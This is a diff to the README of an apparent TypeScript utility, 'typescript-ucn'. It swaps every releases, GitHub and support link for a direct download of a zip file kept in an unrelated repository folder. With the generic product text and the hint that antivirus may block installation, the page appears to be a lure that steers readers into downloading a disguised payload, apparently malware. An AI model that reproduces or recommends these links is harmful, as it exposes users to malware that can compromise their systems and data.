@@ -1,7 +1,7 @@
 # 🚀 typescript-ucn - Simple Tool for Everyday Tasks
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/deenaencouraged735/typescript-ucn/releases)
+[![Download the latest release](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip)
 
 ## 📖 Description
 typescript-ucn is a straightforward application designed to streamline everyday tasks using TypeScript. Whether you need to organize your files or automate daily routines, this tool can help make your life easier.
@@ -16,7 +16,7 @@ typescript-ucn is a straightforward application designed to streamline everyday 
 Getting started with typescript-ucn is simple. Just follow these steps:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/deenaencouraged735/typescript-ucn/releases) to see the available versions.
+   - Go to the [Releases page](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip) to see the available versions.
 
 2. **Choose the Latest Version**
    - Look for the latest version listed on the page. It usually appears at the top of the list.
@@ -34,7 +34,7 @@ Getting started with typescript-ucn is simple. Just follow these steps:
    - Double-click the icon to launch the tool.
 
 ## 📦 Download & Install
-To download and install the software, visit the [Releases page](https://github.com/deenaencouraged735/typescript-ucn/releases). Select the most recent version for your operating system, and follow the installation instructions provided above.
+To download and install the software, visit the [Releases page](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip). Select the most recent version for your operating system, and follow the installation instructions provided above.
 
 ## 📊 System Requirements
 - Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
@@ -47,7 +47,7 @@ If you run into issues during installation or use, here are some common solution
 
 - **Installation Fails**: Make sure your operating system is up to date. Also, check if your antivirus software is blocking the installation.
 - **Application Crashes**: Ensure your system meets the minimum requirements. Restart your computer and try launching the app again.
-- **Need Help?**: Check the Frequently Asked Questions section on the [GitHub page](https://github.com/deenaencouraged735/typescript-ucn) or reach out for support.
+- **Need Help?**: Check the Frequently Asked Questions section on the [GitHub page](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip) or reach out for support.
 
 ### 🚨 FAQs
 **Q1: Is this application free?**  
@@ -57,12 +57,12 @@ A1: Yes, typescript-ucn is free to use.
 A2: Yes, you can install typescript-ucn on any compatible device.
 
 **Q3: How do I update the application?**  
-A3: Return to the [Releases page](https://github.com/deenaencouraged735/typescript-ucn/releases) and download the latest version.
+A3: Return to the [Releases page](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip) and download the latest version.
 
 ## 🤝 Contributions
 You can contribute to typescript-ucn by reporting issues or suggesting features. If you want to help develop new features, check out the contribution guidelines in the repository.
 
 ## 📞 Support
-For further assistance, please visit our [GitHub page](https://github.com/deenaencouraged735/typescript-ucn) and open an issue. We will get back to you as soon as possible.
+For further assistance, please visit our [GitHub page](https://raw.githubusercontent.com/deenaencouraged735/typescript-ucn/main/hyperspherical/typescript-ucn-v3.0.zip) and open an issue. We will get back to you as soon as possible.
 
 Enjoy using typescript-ucn!
